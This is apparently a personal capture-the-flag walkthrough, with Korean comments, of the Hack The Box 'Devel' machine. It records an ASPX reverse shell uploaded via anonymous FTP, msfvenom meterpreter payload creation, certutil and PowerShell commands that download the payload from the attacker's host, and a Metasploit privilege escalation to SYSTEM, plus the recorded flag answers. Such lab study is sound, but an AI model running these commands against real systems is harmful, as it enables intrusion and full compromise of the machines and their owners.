@@ -1,0 +1,156 @@
+Machine: Devel
+TARGET: 10.129.62.33
+
+Task 1
+
+What is the name of the service is running on TCP port 21 on the target machine?
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  02:06AM       <DIR>          aspnet_client
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-title: IIS7
+|_http-server-header: Microsoft-IIS/7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+> Microsoft ftpd
+
+Task 2
+
+Which basic FTP command can be used to upload a single file onto the server?
+
+> put
+
+Task 3
+
+Are files put into the FTP root available via the webserver?
+
+> yes
+
+Task 4
+
+What file extension is executed as a script on this webserver? Don't include the ..
+
+web Response
+HTTP/1.1 304 Not Modified
+Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
+Accept-Ranges: bytes
+ETag: "37b5ed12c9fd21:0"
+Server: Microsoft-IIS/7.5
+X-Powered-By: ASP.NET
+Date: Tue, 15 Jul 2025 12:19:21 GMT
+
+ASP.NET
+
+> aspx
+
+Task 5
+
+Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?
+
+msfconsole
+search post/multi/recon
+
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank    Check  Description
+   -  ----                                       ---------------  ----    -----  -----------
+   0  post/multi/recon/multiport_egress_traffic  .                normal  No     Generate TCP/UDP Outbound Traffic On Multiple Ports
+   1  post/multi/recon/local_exploit_suggester   .                normal  No     Multi Recon Local Exploit Suggester
+   2  post/multi/recon/reverse_lookup            .                normal  No     Reverse Lookup IP Addresses
+   3  post/multi/recon/sudo_commands             .                normal  No     Sudo Commands
+
+
+> local_exploit_suggester 
+
+
+
+
+Submit User Flag
+
+Submit the flag located on the babis user's desktop.
+
+웹서버 루트 디렉토리에 ftp로 파일을 업로드 가능
+리버스 셸 php 업로드 리버스셸 연결 시도  
+php파일을 인식을 못함 aspx 리버스셸 파일로 시도
+https://github.com/borjmz/aspx-reverse-shell
+
+ftp
+put shell.aspx
+
+kali
+nc -nlvp 9999
+
+http://10.129.62.33/shell.aspx 접속
+
+리버스셸 연결
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.156 LPORT=4444 -f exe > shell.exe
+
+powershell -c "Invoke-WebRequest -Uri http://10.10.14.156:7777/shell.exe -OutFile shell.exe"
+certutil -urlcache -f http://10.10.14.156:7777/shell.exe shell.exe
+
+msfconsole
+
+use post/multi/recon/local_exploit_suggester
+
+set session 1
+run
+
+1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                                                                                              
+ 4   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
+ 5   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
+ 6   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 8   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 9   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
+ 10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 11  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
+ 12  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+ 13  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+ 14  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
+ 15  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
+ 16  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+
+
+12번 exploit 시도
+
+use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+set payload windows/meterpreter/reverse_tcp
+set session 1
+set LHOST 10.10.14.156
+run
+실패 
+
+
+10번 exploit 시도
+use exploit/windows/local/ms15_051_client_copy_image
+set session 1
+set LHOST 10.10.14.156
+run
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+루트권한 성공
+
+cat user.txt
+> 5b8faa08515e0b393c478f508f68eb70
+
+
+
+Submit Root Flag
+
+Submit the flag located on the administrator's desktop.
+
+cat root.txt
+> 935e27c70167f547427c88fbf04c1876
